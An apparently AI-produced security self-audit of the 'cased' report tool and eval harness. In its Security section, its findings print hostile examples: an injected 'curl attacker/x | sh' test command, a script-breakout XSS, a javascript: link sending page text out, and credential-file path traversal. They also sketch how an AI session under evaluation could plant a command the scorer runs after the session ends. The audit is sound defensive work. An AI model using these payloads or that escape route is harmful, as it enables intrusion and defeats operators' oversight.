---
audit_date: 2026-08-28
project: cased
commit: 2365a3f79e49d64a8b47d0de4445a80d206a04b0
scope: Full-repo self-audit of cased at 2365a3f — src/ (viewer, recon, schemas), evals/ (runner, scorer, fixtures), skills/ (cased + crustoleum), scripts/, test/
auditor: claude-fable-5 controller; six analysis agents (claude-opus-5 ×5, claude-sonnet-5 ×1) on security, error-handling, completeness, api-design, code-quality, dependencies; adversarial reviewer claude-opus-5; default effort
findings:
  critical: 0
  significant: 7
  moderate: 26
  advisory: 7
  note: 2
---

# Audit: cased

cased is a five-month-old, single-author skill whose product is a contract that language models follow, and this self-audit at `2365a3f` reads its 42 findings as a pre-publish checklist rather than an incident list. **The Security Surface** has no network and no secrets; its posture is the trust it places in model-authored text on the way into HTML and shells, and that trust is nearly total — three blocking findings, one of which corrupted this audit's own `report.html` on the way out. **The Error Handling Surface** fails loudly at the boundaries it was designed for and silently everywhere else; one bare catch lets `finalize` bless an audit whose predecessor's findings were never dispositioned. **The Completeness Surface** promises more than the gates deliver: CI has been red at `check-bundle` on every push for eighteen days, and 29 flow-diagram tests have never run. **The API Design Surface** is coherent where the schema enforces it and drifts where it does not. **The Code Quality Surface** and **The Supply Chain Surface** are backlog — duplicated helpers, untested gate branches, and ~80 bundled packages with no license notices. Fix the two `String.replace` calls and the CI tool list before the release post; the rest is an ordinary August.

Process: six agents returned 45 raw findings; four cross-surface duplicates were collapsed into their fuller siblings. The reviewer traced every mechanism end-to-end — 41 reviewed, 35 confirmed, 6 adjusted, 0 disputed, 0 severity overrides — and its adjustments widened two class sweeps and corrected three counts and a license inventory. The 42nd finding was filed by the controller after assembly, when the built report turned out to be corrupt, and was sent back to the reviewer on its own.

**A note on `report.html` in this directory.** It is the file the current tool produced from this `findings.yaml`, unmodified, and it is unreadable: 30 `<!DOCTYPE>`s, 101 `</html>`s, 98 `cased-data` blocks still holding the literal slot marker, 9.4 MB from a 759-byte template. The first build, before the finding describing this defect was added, had two `<!DOCTYPE>`s and four `</html>`s at 1.3 MB; writing the finding added more `$'`/`` $` `` sequences to the data, and every one of them re-splices the document, so it compounds. The defect is `template-slot-replace-interprets-dollar-patterns` below. Fixing the tool mid-audit would have been remediation, not auditing; rebuild after that fix lands. `findings.yaml` is the artifact of record.

---

## The Security Surface

*cased has no network surface and no secrets, so its security posture is the trust it places in model-authored YAML on its way into HTML and into shells — and that trust is nearly total.*

### Every template slot is filled with String.replace, so a `$'` or `` $` `` anywhere in the audit data splices the document into itself {#template-slot-replace-interprets-dollar-patterns}

**significant** · `src/viewer/build-report.mjs:929-935` · effort: trivial · <img src="assets/sparkline-template-slot-replace-interprets-dollar-patterns.svg" height="14" alt="commit activity" />

`String.prototype.replace(pattern, replacementString)` does not insert the replacement literally: it interprets `$&` (the match), `` $` `` (everything before the match), `$'` (everything after), `$$` and `$<n>`. All six slots in `assembleReport` are filled that way, and the two that carry model-authored data are the ones that matter — `contentHtml` is rendered evidence and prose; `JSON.stringify(dataBlob)` is the entire findings document. Any finding whose evidence or prose contains a dollar sign followed by a backtick or an apostrophe is enough: a shell regex anchor like `[^/]+\.svg)$'`, a JSON-Schema pattern like `` `^[A-Z]+-[0-9]+$` ``. This audit is the proof. Its own `findings.yaml` contained both sequences before this finding existed (in the `hygiene-gate-swallows-git-failure` evidence and the `contract-fields-absent-from-schema` remediation), and the first build had two `<!DOCTYPE>`s, four `</html>`s, four `<script id="cased-data">` blocks still holding the literal `<!-- SLOT:data -->`, and six orphaned `<!-- SLOT:viewer -->` markers. Writing this finding added more such sequences, and the rebuild beside this file has 30 `<!DOCTYPE>`s and 101 `</html>`s — each splice re-inserts a document that already contains the trigger, so it compounds. Nothing in `build`, `validate` or `finalize` inspects the assembled HTML, so the corrupted deliverable ships silently. Reachability is total — dollar signs are ordinary in shell, Perl, PHP, Makefiles, regexes and template languages.

```javascript src/viewer/build-report.mjs:929-935
  const html = template
    .replace('<!-- SLOT:title -->', escHtml(title))
    .replace('<!-- SLOT:fonts -->', fontFaceDecls)
    .replace('<!-- SLOT:style -->', allCss)
    .replace('<!-- SLOT:content -->', contentHtml)
    .replace('<!-- SLOT:data -->', JSON.stringify(dataBlob))
    .replace('<!-- SLOT:viewer -->', allJs);
```

> I don't need a payload. I need a Makefile. The auditor copies my source verbatim into its evidence — the skill insists on it — and the first `$'` in a sed script turns its report into a document that reads its own preamble twice and never reaches the viewer.

Related: [Model-authored YAML is injected raw into the report's script data block](#report-data-blob-script-breakout), [summary.counts is author-supplied and never reconciled](#summary-counts-never-cross-checked).

**Remediation:** Never pass model-authored text as a string replacement. Use the function form, which inserts literally, for all six slots — `allCss` and `allJs` are safe today only by accident:

```javascript
  const html = template
    .replace('<!-- SLOT:title -->', () => escHtml(title))
    .replace('<!-- SLOT:content -->', () => contentHtml)
    .replace('<!-- SLOT:data -->', () => json)
    // ...
```

Then add the assertion that belongs in `build`: after assembly the HTML must contain exactly one `<!DOCTYPE`, no remaining `<!-- SLOT:` marker, and a `cased-data` element that `JSON.parse`s; fail the build otherwise. Add a unit test that assembles a findings document containing `$'`, `` $` `` and `$&` and asserts they survive byte-for-byte. This directory is the regression fixture. The fix is not done until the bundle is rebuilt (`scripts/build-viewer.sh`, `just check-bundle`): the shipped `skills/cased/scripts/build-report.js:40775` carries the identical chain and is what every skill user actually executes.

<div>&hairsp;</div>

### Model-authored YAML is injected raw into the report's `<script>` data block {#report-data-blob-script-breakout}

**significant** · `src/viewer/build-report.mjs:929-935`, `src/viewer/viewer.js:7-8` · effort: small · <img src="assets/sparkline-report-data-blob-script-breakout.svg" height="14" alt="commit activity" />

`assembleReport` drops `JSON.stringify(dataBlob)` verbatim into `<script id="cased-data" type="application/json">`. `JSON.stringify` escapes quotes and backslashes but never `<` or `/`, and the HTML parser terminates a script element at the first literal `</script` regardless of JSON context. Every string in that blob is model-authored or copied out of the audited repo — evidence blocks are *required* by the fidelity gate to be verbatim source — so auditing any repo that contains the byte sequence `</script>` (an HTML template, a JS bundle, cased's own `src/viewer/template.html`) ends the data element early and reparses everything after it as markup. Even with no payload the breakage is certain: the truncated JSON makes `JSON.parse` at `viewer.js:8` throw inside the `DOMContentLoaded` handler before `initAnnotations`, `initSlides` and `initNavBar` run, so the report silently loses every interactive feature — and the parse buys nothing, because `data` is never read. `build` never invokes the schema validator (that is the separate `validate` subcommand), and `escHtml` is applied to the title slot but not the data slot.

```javascript src/viewer/build-report.mjs:929-935
  const html = template
    .replace('<!-- SLOT:title -->', escHtml(title))
    .replace('<!-- SLOT:fonts -->', fontFaceDecls)
    .replace('<!-- SLOT:style -->', allCss)
    .replace('<!-- SLOT:content -->', contentHtml)
    .replace('<!-- SLOT:data -->', JSON.stringify(dataBlob))
    .replace('<!-- SLOT:viewer -->', allJs);
```

```javascript src/viewer/viewer.js:7-8
  const dataEl = document.getElementById('cased-data');
  const data = dataEl ? JSON.parse(dataEl.textContent) : {};
```

> The report gets forwarded to the people who decide things. If my repository contains `</script><img src=x onerror=…>` in a fixture, the auditor will quote it faithfully and hand it to their browser as markup.

Related: [String.replace splices the document](#template-slot-replace-interprets-dollar-patterns), [Header metadata bypasses the escaper](#unescaped-metadata-in-report-markup), [renderProse emits javascript: hrefs](#prose-links-allow-javascript-uris).

**Remediation:** Escape the JSON before interpolation — replace `<`, `>`, `&`, U+2028 and U+2029 with their `\uXXXX` forms, which stay valid JSON and are inert to the HTML parser:

```javascript
const json = JSON.stringify(dataBlob)
  .replace(/[<>&  ]/g, c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0'));
```

In `viewer.js` either delete the dead parse or wrap it in `try/catch` so a malformed blob degrades to a static report instead of killing every initializer.

<div>&hairsp;</div>

### The eval scorer executes recon.yaml's testing.command through a shell {#eval-scorer-shells-out-model-authored-test-command}

**significant** · `src/recon/recon-to-yaml.mjs:313-322`, `evals/scripts/score-eval.mjs:256-257`, `evals/scripts/score-eval.mjs:301-307` · effort: small · <img src="assets/sparkline-eval-scorer-shells-out-model-authored-test-command.svg" height="14" alt="commit activity" />

`scoreRemediation` runs the project's workspace gate with `shell: true`, which makes the whole string a `/bin/sh` command line. `gateCommand` is the operator's `--test-command` only when one is passed, and `run-eval`'s remediate branch never passes it, so on every real run the executed string is `recon.yaml#testing.command` read out of the audit directory inside the eval workdir. Two independent writers control that value: `detectTesting` priority 1 copies it verbatim from the target repo's scrat config, so the repository under audit chooses the string; and the workdir belongs to the headless session under test, which runs with `acceptEdits` and `Write` allowlisted and is told to author files under `record/audits/`. A session that writes `command: "just test; curl attacker/x | sh"` gets that line executed on the operator's machine, unsandboxed, after the session has ended. This is the only `shell: true` in the workspace; the other two `execFileSync` sites invoke git with argv arrays and a SHA constrained to `[0-9a-f]{7,40}`.

```javascript src/recon/recon-to-yaml.mjs:313-322
export function detectTesting(targetPath) {
  // Priority 1: scrat config commands.test
  const scratResult = detectScratTest(targetPath);
  if (scratResult) {
    return finalizeTesting({
      command: scratResult.command,
      sources: [scratResult.source],
      targetPath,
    });
  }
```

```javascript evals/scripts/score-eval.mjs:301-307
  let gatePass = false;
  if (gateCommand) {
    try {
      execFileSync(gateCommand, { cwd: repoRoot, shell: true, stdio: 'ignore' });
      gatePass = true;
    } catch { gatePass = false; }
  }
```

> The session is over and my tools are gone, but the operator still has to score me. The scorer reads a file I was allowed to write and hands it to a shell.

Enabled by [Eval runs grant unrestricted Bash](#eval-runner-drives-unsandboxed-headless-session).

**Remediation:** Drop `shell: true` and run the gate as an argv array — tokenize the configured command properly, or require the fixture to declare it as a list (`test_command: ["just", "test"]`). If a shell is genuinely needed, take the command only from `--test-command` or the fixture's `expected-findings.yaml` (both operator-authored, outside the session's write scope), never from a `recon.yaml` the session could edit; log the exact command line before executing it either way.

<div>&hairsp;</div>

### Header metadata and flow-diagram concern labels bypass the HTML escaper {#unescaped-metadata-in-report-markup}

**moderate** · `src/viewer/build-report.mjs:356-357`, `src/viewer/flow-to-svg.js:107-108`, `src/viewer/build-report.mjs:342`, `src/viewer/build-report.mjs:360-361`, `src/viewer/build-report.mjs:472` · effort: trivial · <img src="assets/sparkline-unescaped-metadata-in-report-markup.svg" height="14" alt="commit activity" />

Both renderers escape their neighbouring fields and skip these. `findings.audit_date` and `findings.commit` go straight into the header markup and `finding.concern` straight into the flow SVG, while `scope` on the same line and `displayTitle` on the line above are escaped. Their safety rests entirely on the schema (`format: date`, an enum) — but `build` never invokes the validator, so a run that skips Phase 3a, a direct `build-report.js <dir>`, or a findings.yaml hand-edited between validate and build reaches these sinks with arbitrary strings. The reviewer's sweep found the class wider than the finder's "only three": the *keys* of `summary.counts` are interpolated raw into the glossary and into both an attribute and text in the summary bar, and `loc.start_line` goes unescaped into the ledger cell beside an escaped path. The counts keys are not enum-bound — `summary.counts` is an open object — so an arbitrary key validates and reaches an attribute sink. Five sinks, not three.

```javascript src/viewer/build-report.mjs:356-357
      <h1>${escHtml(findings.scope || 'Audit')} Audit</h1>
      <p class="meta">${findings.audit_date} &middot; <code>${(findings.commit || '').slice(0, 12)}</code> &middot; ${escHtml(findings.scope || '')}</p>
```

```javascript src/viewer/build-report.mjs:360-361
${Object.entries(counts).filter(([, v]) => v > 0).map(([level, count]) =>
  `        <span class="summary-count" data-concern="${level}">${count} ${level}</span>`
```

Related: [Model-authored YAML is injected raw into the script data block](#report-data-blob-script-breakout).

**Remediation:** Wrap all five in the escaper already in scope at each site — `escHtml(findings.audit_date)`, `escHtml((findings.commit || '').slice(0, 12))`, `esc(finding.concern.toUpperCase())`, `escHtml(level)` at both counts sites, `escHtml(loc.start_line)`. Independently, make `build` run the compiled validators before rendering so the render path stops depending on a process step a model can skip.

<div>&hairsp;</div>

### renderProse emits any URI scheme into href, including javascript: {#prose-links-allow-javascript-uris}

**moderate** · `src/viewer/build-report.mjs:223-231` · effort: trivial · <img src="assets/sparkline-prose-links-allow-javascript-uris.svg" height="14" alt="commit activity" />

`renderProse` turns markdown links in model-authored free text into anchors, and it is applied to `assessment` and to every finding's `mechanism` and `remediation` — all plain `type: string` in the schema, no pattern. `escHtml` keeps the attribute from breaking out but performs no scheme check, so `[click](javascript:fetch('https://x/?'+document.body.innerText))` in a subagent's prose renders as a live `javascript:` link. Reachability does not require a malicious operator: the audited repository is untrusted input to the analysis agents, and the report is a document that gets forwarded to reviewers who have every reason to trust its links. `data:` and `vbscript:` are equally unfiltered.

```javascript src/viewer/build-report.mjs:223-231
  const pattern = /\[([^\]]+)\]\(([^)]+)\)|\*\*([^*]+)\*\*|`([^`]+)`/g;
  let match;
  while ((match = pattern.exec(str)) !== null) {
    if (match.index > lastIndex) {
      tokens.push(escHtml(str.slice(lastIndex, match.index)));
    }
    if (match[1] !== undefined) {
      tokens.push(`<a href="${escHtml(match[2])}">${escHtml(match[1])}</a>`);
    } else if (match[3] !== undefined) {
```

**Remediation:** Parse `match[2]` with `new URL(href, 'https://x.invalid')` in a `try/catch` and emit an anchor only for an allowlisted protocol set (`http:`, `https:`, `mailto:`, bare fragments, relative paths); otherwise render the link text as escaped plain text. Add `rel="noopener noreferrer"`.

<div>&hairsp;</div>

### Evidence fidelity gate follows absolute and traversing finding paths {#evidence-gate-reads-outside-the-repo-root}

**moderate** · `src/viewer/gates.mjs:18-23`, `src/schemas/findings.schema.json:60-62` · effort: small · <img src="assets/sparkline-evidence-gate-reads-outside-the-repo-root.svg" height="14" alt="commit activity" />

`checkEvidenceFidelity` exists to bind a finding's evidence to the audited source tree, and it is the one gate that reads files named by model-authored YAML. `fileLines` treats an absolute path as authoritative and resolves everything else with `join()`, which happily normalises `../../../../etc/passwd`; the schema puts no pattern or relative-path constraint on `path`. On mismatch the gate prints the source line back to the operator, and on match the content renders into `report.html` as gate-verified evidence. A finding citing `/Users/<user>/.aws/credentials:3-3` turns the fidelity gate into a one-line-at-a-time reader for any file the operator can read. This gate is the wrong place to trust the model — every other check in `gates.mjs` exists specifically to stop trusting it.

```javascript src/viewer/gates.mjs:18-23
function fileLines(repoRoot, p) {
  const abs = isAbsolute(p) ? p : join(repoRoot, p);
  if (!existsSync(abs)) return null;
  const txt = readFileSync(abs, 'utf8');
  return txt.split('\n');
}
```

**Remediation:** Resolve with `resolve(repoRoot, p)` and reject anything that does not start with `resolve(repoRoot) + sep`, pushing a `path-escapes-repo` problem instead of reading — the problem list already has the right shape. Reject absolute values outright, add a relative-path pattern to `locations.items.path` in the schema, and re-stamp the contract.

<div>&hairsp;</div>

### Eval runs grant unrestricted Bash with no sandbox on the claude platform {#eval-runner-drives-unsandboxed-headless-session}

**moderate** · `evals/scripts/run-eval:138-142`, `evals/scripts/run-eval:157-161` · effort: medium · <img src="assets/sparkline-eval-runner-drives-unsandboxed-headless-session.svg" height="14" alt="commit activity" />

The two platform branches make opposite trust decisions about the same workload. The codex branch runs under `-s workspace-write --ephemeral --ignore-user-config`, deliberately hermetic. The claude branch allowlists bare `Bash` with no command pattern and sets `acceptEdits`, so every shell command the session or its subagents choose is auto-approved with the operator's full rights, and nothing confines writes to `$WORKDIR`. The session's job is to read a repository it has never seen and act on what it reads — exactly the shape that makes prompt-injected content consequential — and the harness then trusts artifacts that session wrote. Fixtures are first-party today, which is why this is moderate, but the asymmetry shows the confinement question was already answered once and left open here.

```bash evals/scripts/run-eval:138-142
ALLOWED_TOOLS="Bash,Read,Write,Edit,Glob,Grep,Task,Skill,TodoWrite"

case "$PLATFORM" in
  claude)
    CMD=(claude -p "$PROMPT" --output-format text --permission-mode acceptEdits --allowedTools "$ALLOWED_TOOLS")
```

Enables [The eval scorer executes testing.command through a shell](#eval-scorer-shells-out-model-authored-test-command).

**Remediation:** Bring the claude branch to the codex branch's posture — narrow `--allowedTools` to the Bash prefixes the pipeline needs (`Bash(cargo:*)`, `Bash(git:*)`, `Bash(node:*)`, `Bash(just:*)`, `Bash(tokei:*)`) or run the session in a sandbox rooted at `$WORKDIR`. Document the residual trust level at the top of `run-eval`.

*The renderer is the attack surface, and this audit broke it on the way out; the eval harness's trust decisions are documented on one platform and missing on the other. All are small fixes at known interpolation sites.*

---

## The Error Handling Surface

*The CLIs fail loudly at the boundaries they were designed for and silently everywhere else — bare catches, unguarded reads, and exit codes that carry no consistent meaning.*

### Bare catch blocks substitute a default for nine fallible operations, one of which defeats the finalize gate {#bare-catch-erases-failure-cause}

**significant** · `src/viewer/prior-audits.mjs:46-51`, `src/viewer/build-report.mjs:1022-1027`, `src/recon/recon-to-yaml.mjs:422-427`, `evals/scripts/score-eval.mjs:301-307`, and five more · effort: small · <img src="assets/sparkline-bare-catch-erases-failure-cause.svg" height="14" alt="commit activity" />

Twelve catch sites in `src/` and `evals/scripts/`; nine bind no error, log nothing, and return a value indistinguishable from a legitimate result. The worst is `countFindings`: `prior-audits.mjs` exists, per its own header, because "a prior audit with findings and no ledger is a process failure — findings evaporate", and `finalizeAudit` enforces exactly that with `if (p.findingCount > 0 && !p.hasLedger)`. An unparseable prior `findings.yaml` is reported as zero findings, so `finalize` exits 0 and blesses an audit whose predecessor's findings were never dispositioned — the gate succeeds precisely when its input is broken. The others degrade the same way: a git failure reads as the misleading "commit not found (squash-merge?)"; a malformed `.config/scrat.yaml` falls through to a lower-priority detector and publishes `testing.sources` naming a file it could not read; a gate command that does not exist scores identically to one whose tests failed. The reviewer's sweep added five: three silently-skipped config reads in `recon-to-yaml.mjs`, and two in `score-eval.mjs` that distort eval scores directly — an unreadable baseline ledger makes every entry count as session work, and a git failure in `fixCommits` reports `trailers_ok 0/0`.

```javascript src/viewer/prior-audits.mjs:46-51
function countFindings(findingsPath) {
  try {
    const doc = parseYaml(readFileSync(findingsPath, 'utf8')) ?? {};
    return (doc.narratives ?? []).reduce((n, nar) => n + (nar.findings ?? []).length, 0);
  } catch { return 0; }
}
```

Related: [finalize skips the ledger's commit checks](#finalize-skips-ledger-commit-verification).

**Remediation:** Bind the error in each block and make the failure visible. `countFindings` returns `null` on a parse error and `finalizeAudit` treats `null` as an error ("prior audit has an unreadable findings.yaml"), never as zero. `gitLog` distinguishes "commit unknown" (git exit 128) from "git could not run". The config detectors warn on stderr before falling through. `scoreRemediation` records the spawn error so `workspace_gate_pass: false` can be told apart from "gate never executed".

<div>&hairsp;</div>

### The build subcommand reads its inputs unguarded and has no rejection handler {#build-subcommand-unguarded-io}

**moderate** · `src/viewer/build-report.mjs:857-861`, `src/viewer/build-report.mjs:940-942` · effort: small · <img src="assets/sparkline-build-subcommand-unguarded-io.svg" height="14" alt="commit activity" />

The four non-default subcommands guard their inputs and exit with a message. The default `build` path calls `readFileSync` straight through, and the whole CLI body is an async IIFE with no `.catch()`, so a missing or malformed `findings.yaml`, a malformed prior `actions-taken.md`, or an unreadable font escapes as an unhandled rejection: Node prints the raw stack and exits 1 — the same code the script uses for usage errors and validation failures. Missing input is 2 under `evidence`, 1 under `ledger`, 1 with a stack trace under `build`.

```javascript src/viewer/build-report.mjs:857-861
  const findingsYaml = readFileSync(join(auditDir, 'findings.yaml'), 'utf8');
  const reconYaml = readFileSync(join(auditDir, 'recon.yaml'), 'utf8');

  const findings = parseFindings(findingsYaml);
  const recon = parseRecon(reconYaml);
```

Related: [Font directory resolution can yield undefined](#fonts-dir-resolution-unguarded), [An unrecognised subcommand becomes the audit directory](#build-report-subcommand-fallback).

**Remediation:** Wrap the IIFE body in `try/catch` (or append `.catch(err => { console.error(\`error: ${err.message}\`); process.exit(1); })`), add the same `existsSync` preflight the siblings use, and document one exit-code contract — 2 for missing input, 1 for gate failure — across all five subcommands.

<div>&hairsp;</div>

### Font directory resolution can yield undefined and crashes in path.join instead of failing like its sibling check {#fonts-dir-resolution-unguarded}

**moderate** · `src/viewer/build-report.mjs:1055-1065`, `src/viewer/build-report.mjs:905-907` · effort: trivial · <img src="assets/sparkline-fonts-dir-resolution-unguarded.svg" height="14" alt="commit activity" />

`viewerDir` gets an explicit guard with an actionable message. `fontsDir`, resolved three lines later by the same `Array.prototype.find` idiom, gets nothing — `find` returns `undefined` when none of the three candidates exist, and that reaches `join(fontsDir, file)` inside a `.map()` callback as `ERR_INVALID_ARG_TYPE` with no mention of fonts or of which paths were searched. The block also reads each `.woff2` without checking it exists, so a trimmed skill install produces an equally contextless `ENOENT`.

```javascript src/viewer/build-report.mjs:905-907
    const fontFaceDecls = fontFiles.map(({ file, family }) => {
      const fontPath = join(fontsDir, file);
      const b64 = readFileSync(fontPath).toString('base64');
```

**Remediation:** Mirror the `viewerDir` guard, naming the candidate list on failure; check each font file exists before reading.

<div>&hairsp;</div>

### A scorer crash leaves a zero-byte score.json that defeats compare-runs' own guard {#score-json-truncated-by-redirect}

**moderate** · `evals/scripts/run-eval:287-290`, `evals/scripts/compare-runs.mjs:14-18` · effort: trivial · <img src="assets/sparkline-score-json-truncated-by-redirect.svg" height="14" alt="commit activity" />

The shell truncates `score.json` before `score-eval.mjs` runs. If the scorer exits non-zero, `set -e` aborts `run-eval`, but the empty file stays behind at the end of a run that cost minutes and real tokens. `compare-runs.mjs` was written with exactly this failure in mind — its `existsSync` check says "no score.json (did run-eval finish?)" — but a zero-byte file passes it, so the operator gets `SyntaxError: Unexpected end of JSON input` instead.

```bash evals/scripts/run-eval:287-290
  node "$EVALS_DIR/scripts/score-eval.mjs" "$FIXTURE_DIR" "${SCORE_ARGS[@]}" --json \
    > "$RUN_DIR/score.json"
  node "$EVALS_DIR/scripts/score-eval.mjs" "$FIXTURE_DIR" "${SCORE_ARGS[@]}" \
    | tee "$RUN_DIR/score.txt"
```

Enabled by [Both eval CLIs gate main() on a raw string compare](#entrypoint-guard-unresolved-path).

**Remediation:** Score to a temp file and `mv` into place only on success; harden `loadRun` to treat an empty or unparseable `score.json` as the same "did run-eval finish?" condition.

<div>&hairsp;</div>

### The stray-file hygiene gate reports a clean run when git itself fails {#hygiene-gate-swallows-git-failure}

**moderate** · `evals/scripts/run-eval:215-221` · effort: trivial · <img src="assets/sparkline-hygiene-gate-swallows-git-failure.svg" height="14" alt="commit activity" />

The `|| true` is needed because the final `grep` exits 1 in the good case, but under `pipefail` it also absorbs a failure of any earlier stage. If `git status` fails — the workdir's `.git` was rewritten by a fixture, git is missing — `STRAYS` is empty and the run records `stray_file_count: 0`: the same output as a perfectly clean run. A measurement the harness exists to produce silently reports the best possible result whenever its own instrumentation breaks, and `run-meta.yaml` carries no field to tell the two apart.

```bash evals/scripts/run-eval:215-221
SANCTIONED='^record/audits/[^/]+/(README\.md|report\.html|AGENTS\.md|CLAUDE\.md|recon\.yaml|findings\.yaml|actions-taken\.md|assets/sparkline-[^/]+\.svg)$'
STRAYS="$(git -C "$WORKDIR" status --porcelain -uall \
  | sed 's/^...//' \
  | grep -vE '^(\.crustoleum/|target/)' \
  | grep -vE "$SANCTIONED" || true)"
STRAY_COUNT=0
[[ -n "$STRAYS" ]] && STRAY_COUNT="$(echo "$STRAYS" | wc -l | tr -d ' ')"
```

**Remediation:** Capture git's status separately (`PORCELAIN="$(git … status --porcelain -uall)" || { echo "error: git status failed" >&2; exit 1; }`) and apply `|| true` only to the filtering stage; or record `stray_file_count: unknown` so the scorer can refuse to credit the run.

<div>&hairsp;</div>

### Both eval CLIs gate main() on a raw string compare that fails silently with exit 0 {#entrypoint-guard-unresolved-path}

**moderate** · `evals/scripts/score-eval.mjs:494-496`, `evals/scripts/compare-runs.mjs:149-151` · effort: trivial · <img src="assets/sparkline-entrypoint-guard-unresolved-path.svg" height="14" alt="commit activity" />

`import.meta.url` is percent-encoded and symlink-resolved; `process.argv[1]` is neither. Under a path containing a space, `#`, or non-ASCII, or through a symlink, the strings differ, `main()` never runs, and the process exits 0 having printed nothing — which `run-eval` redirects straight into `score.json`. The other two entry points in the repo already use the correct idiom (`realpathSync` on both sides).

```javascript evals/scripts/score-eval.mjs:494-496
if (import.meta.url === `file://${process.argv[1]}`) {
  main();
}
```

Enables [A scorer crash leaves a zero-byte score.json](#score-json-truncated-by-redirect).

**Remediation:** Replace both guards with `realpathSync(process.argv[1]) === realpathSync(fileURLToPath(import.meta.url))`; optionally have `run-eval` assert `-s "$RUN_DIR/score.json"` after each scorer invocation.

<div>&hairsp;</div>

### recon-to-yaml collapses every failure into exit 3, contradicting recon's documented exit codes {#recon-catch-all-collapses-exit-3}

**moderate** · `src/recon/recon:10-15`, `src/recon/recon-to-yaml.mjs:703-706` · effort: small · <img src="assets/sparkline-recon-catch-all-collapses-exit-3.svg" height="14" alt="commit activity" />

The pre-runner publishes a four-code taxonomy and `exec`s `recon-to-yaml.mjs`, so the Node script's exit code *is* recon's. That script wraps its whole body in one catch that exits 3 — "required tool missing or tool failed" — so malformed tokei JSON, an unexpected cargo metadata shape, an unwritable audit dir, or a full disk all point the caller at their PATH, with `err.message` only and no stack.

```bash src/recon/recon:10-15
# Exit codes:
#   0  success — <audit-dir>/recon.yaml written and validated
#   1  usage error
#   2  not a Rust project (no Cargo.toml in target)
#   3  required tool missing or tool failed
#   4  validation failure (propagated from recon-to-yaml.mjs)
```

Related: [recon's exec hand-off discards the EXIT trap](#recon-exec-skips-tmp-cleanup).

**Remediation:** Keep 3 for genuinely missing tooling inputs, add a code for "internal error while assembling recon.yaml", print `err.stack`, and update the exit-code block to match.

<div>&hairsp;</div>

### The fixture's EXIT trap deletes the only copy of the files it moved out of the workdir {#setup-trap-deletes-only-copy}

**advisory** · `evals/fixtures/reaudit-rs/setup.sh:78-85` · effort: trivial · <img src="assets/sparkline-setup-trap-deletes-only-copy.svg" height="14" alt="commit activity" />

The script moves — not copies — the unsubstituted ledger and the prior-audit directory into `$STASH` after `rm -rf .git`, and the EXIT trap fires on the failure path as readily as on success. Any abort before the restore deletes the only copy of the moved artifacts; the comment acknowledges the workdir becomes unrecoverable, but the trap is what makes it so.

```bash evals/fixtures/reaudit-rs/setup.sh:78-85
STASH="$(mktemp -d)"
# The stash is the only copy of the final main.rs/config.rs and the unsubstituted
# ledger while the rewind is in flight: if this script dies mid-run the workdir is
# unrecoverable, so re-rsync a fresh one rather than re-running setup.sh over it.
trap 'rm -rf "$STASH"' EXIT
cp src/main.rs src/config.rs "$STASH/"
mv "$LEDGER" "$STASH/actions-taken.md"
mv "$AUDIT_DIR" "$STASH/audit-dir"
```

**Remediation:** `cp -a` instead of `mv`, or gate the trap on a `SUCCESS` flag and print the stash path on failure; add cleanup for the per-edit temp file.

<div>&hairsp;</div>

### recon's exec hand-off discards the EXIT trap, leaking its temp directory on every successful run {#recon-exec-skips-tmp-cleanup}

**advisory** · `src/recon/recon:56-57`, `src/recon/recon:164-165` · effort: trivial · <img src="assets/sparkline-recon-exec-skips-tmp-cleanup.svg" height="14" alt="commit activity" />

`exec` replaces the shell process image, so the EXIT trap never fires. Every run that reaches the `exec` — every successful run — leaves its mktemp directory behind with the full cargo metadata, tokei output, and twelve months of git log. Only the cheap early-exit paths clean up.

```bash src/recon/recon:164-165
echo "recon: building recon.yaml"
exec node "$SCRIPT_DIR/recon-to-yaml.mjs" "$TMP" "$AUDIT_DIR/recon.yaml"
```

**Remediation:** Drop the `exec`; the status still propagates under `set -e`.

*Nothing here loses data, but several paths turn a diagnosable failure into a default value or a raw stack trace, and one of them lets `finalize` bless an audit whose predecessor's findings were never dispositioned. Bind the error, name it, keep the exit code honest.*

---

## The Completeness Surface

*The prose promises more than the gates deliver: two CI jobs abort before checking anything, a third of the test suite never runs, and several documents describe a repository that no longer exists.*

### CI's bundle and smoke gates abort before they check anything {#ci-drift-gates-abort-without-ys}

**significant** · `.github/workflows/ci.yaml:25-31`, `src/schemas/build-schemas.sh:29-35` · effort: trivial · <img src="assets/sparkline-ci-drift-gates-abort-without-ys.svg" height="14" alt="commit activity" />

AGENTS.md states as an iron rule that "CI fails on drift (check-contract, check-bundle)". `check-bundle` and `build-smoke` both run `scripts/build-viewer.sh`, whose first action is `build-schemas.sh`, which hard-requires `jq` and `ys` and exits 1 without them. The CI `test` job installs only `just`; only the separate `contract` job installs `yaml-schema`, and it runs `check-contract` alone. So both shipped-artifact gates abort with "required tool 'ys' not found" before rolldown ever runs. The reviewer corroborated it live: `gh run view 33225668147 --log-failed` shows the test job dying at `just check-bundle`, and the last eight CI runs — every push from 2026-08-11 through 2026-08-29 — are failures. `just test` passes first, which is why the redness went unnoticed. The maintainer never sees it locally because `ys` is installed there.

```yaml .github/workflows/ci.yaml:25-31
      - uses: taiki-e/install-action@3d7d7cd5ac7f994c1892ae0c06165095b9139094 # v2.85.1
        with:
          tool: just
      - run: npm ci
      - run: just test
      - run: just check-bundle
      - run: just build-smoke
```

Related: [29 flow-diagram tests are not in just test](#flow-diagram-tests-excluded-from-suite), [AGENTS.md briefs agents on things that no longer exist](#agents-md-stale-after-prelaunch-cleanup).

**Remediation:** Add `yaml-schema` to the `test` job's install list (`tool: just,yaml-schema`), or split schema-doc regeneration out of `build-viewer.sh` so bundling does not depend on `ys`. Annotate `check-bundle` and `build-smoke` in AGENTS.md with the same "(needs ys)" note `check-contract` already carries.

<div>&hairsp;</div>

### 29 flow-diagram tests are not in `just test`, so nothing runs them {#flow-diagram-tests-excluded-from-suite}

**significant** · `Justfile:66-68`, `.github/workflows/ci.yaml:29` · effort: trivial · <img src="assets/sparkline-flow-diagram-tests-excluded-from-suite.svg" height="14" alt="commit activity" />

`test/` holds eight test files; the recipe enumerates seven. `test/flow-to-svg.test.mjs` — 352 lines, 29 `it()` cases covering spine layout, decision branches, off-spine annotation, loop-back arrows — is silently omitted, and `git log -S'flow-to-svg' -- Justfile` returns nothing, so it has never been listed since the file was added in April. CI runs `just test` and nothing else; `flowToSvg()` runs on every narrative with a `flow:` block, which SKILL.md tells agents to add by default. The enumerated runner list is an allowlist that fails open: no error, no skipped count, just silence. It is the sole escape hatch in the suite.

```just Justfile:66-68
# Run tests
test:
